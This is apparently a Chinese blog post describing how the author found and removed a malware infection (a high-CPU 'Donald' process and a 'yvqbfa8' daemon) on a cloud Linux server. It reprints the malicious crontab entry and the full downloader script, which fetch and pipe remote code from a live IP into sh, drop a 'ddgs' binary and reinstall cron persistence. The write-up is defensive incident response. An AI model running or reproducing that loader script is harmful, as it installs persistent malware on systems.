---
title: Linux服务器病毒查杀经过
date: 2019-12-16 11:22:47
tags: Linux
categories: 技术
---

# 概述

手上一个阿里云的服务器，最近发现CPU占用率飙高，有190.7%，影响了服务器的性能。 top一下系统的进程占用情况，发现有个不知名的进程Donald一直占用CPU，将进程杀死，还有执行程序删除后，过段时间，执行程序又会自动生成，并且自动启动了，当时推测有个定时任务自动去其他服务器自动下载可执行病毒程序。装了iftop软件检测异常网络流量，无果。最后推测是否这个病毒是否存在一个守护进程在检测和生成这个可执行病毒程序，结果是解决了这个病毒。

```
[root@izuf63bc56k6c8viz98bd1z ~]# top

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                                       
32448 root      20   0  304956 268232   1476 S 190.7  6.9   4:05.54 Donald
```

第一次排查系统中毒，问题比较棘手，花了2天，解决了。特此记录下，方便后续参考。

# 解决过程

1. 查询进程的执行程序

   ```
    [root@izuf63bc56k6c8viz98bd1z ~]# cd /proc/32448
    [root@izuf63bc56k6c8viz98bd1z 32448]# ll
    lrwxrwxrwx  1 root root 0 Dec 15 01:21 exe -> /tmp/Donald
   ```

   可以看到这个可以病毒的执行程序是Donald，位于/tmp 下。

2. 杀死可疑进程 在top执行结果界面中，按K，输入32448，再enter下，即是kill -9 32448的效果。

![top命令](/images/top.png)

1. 再删除病毒程序

   [root@izuf63bc56k6c8viz98bd1z 11770]# rm -rf /tmp/Donald

2. 过段时间，又会生成/tmp/Danold ,开始定位原因。

①crontab任务

```
[root@izuf63bc56k6c8viz98bd1z ~]# crontab -l -u root
*/15 * * * * (/usr/bin/yvqbfa8||/usr/libexec/yvqbfa8||/usr/local/bin/yvqbfa8||/tmp/yvqbfa8||curl -m180 -fsSL <http://218.93.239.148:5071/i.sh||wget> -q -T180 -O- <http://218.93.239.148:5071/i.sh>) | sh
```

可以看见有个crontab任务在执行下载，读了一下，好像跟Donald无关。读了一下http://218.93.239.148:5071/i.sh下载的文件，

```
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

mkdir -p /var/spool/cron/crontabs
echo "" > /var/spool/cron/root
echo "*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -fsSL -m180 <http://218.93.239.148:5071/i.sh||wget> -q -T180 -O- <http://218.93.239.148:5071/i.sh>) | sh" >> /var/spool/cron/root
cp -f /var/spool/cron/root /var/spool/cron/crontabs/root

cd /tmp
touch /usr/local/bin/writeable && cd /usr/local/bin/
touch /usr/libexec/writeable && cd /usr/libexec/
touch /usr/bin/writeable && cd /usr/bin/
rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable

export PATH=$PATH:$(pwd)
ps auxf | grep -v grep | grep gewqfa8 || rm -rf gewqfa8
if [ ! -f "gewqfa8" ]; then
    curl -fsSL -m1800 <http://218.93.239.148:5071/static/4008/ddgs.$>(uname -m) -o gewqfa8||wget -q -T1800 <http://218.93.239.148:5071/static/4008/ddgs.$>(uname -m) -O gewqfa8
fi
chmod +x gewqfa8
/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8

ps auxf | grep -v grep | grep gewqbcb | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqbcc | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqbcd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqbce | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqfa0 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqfa1 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqfa2 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqfa3 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep gewqfa4 | awk '{print $2}' | xargs kill -9

echo "*/15 * * * * (/usr/bin/gewqfa8||/usr/libexec/gewqfa8||/usr/local/bin/gewqfa8||/tmp/gewqfa8||curl -m180 -fsSL <http://218.93.239.148:5071/i.sh||wget> -q -T180 -O- <http://218.93.239.148:5071/i.sh>) | sh" | crontab -
```

源码大概意思是，下载一个ddgs.x86_32 文件另存为 gewqfa8,执行gewqfa8生成yvqbfa8进程，会在tmp生成Donald执行程序，如果没有则会创建并且执行。很狡猾这个黑客，进程名换了几个，我vi gewqfa8 和 Donald 想读下病毒是怎么写的，可是源码被混淆了，黑客这样做是为了躲过一些杀毒软件的查杀吧。

②可疑守护进程yvqbfa8

```
[root@izuf63bc56k6c8viz98bd1z ~]# top
PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                                                       
32448 root      20   0  304956 268232   1476 S 190.7  6.9   4:05.54 Donald
31906 root      20   0  185484 109744   208  S 31.6   2.8   2:56.30 yvqbfa8

[root@izuf63bc56k6c8viz98bd1z bin]# kill -9 31906
```

再观察已经没有再生成Donald程序了。回头分析一下crontab任务，每15s执行下/usr/local/bin/yvqbfa8，yvqbfa8这个文件有点猫腻，可是vi 出来是乱码，是shell脚本被黑客混淆了，目前没找到方案解混淆。

# 解决方案

kill 病毒进程，删除crontab任务，删除执行文件gewqfa8，Donald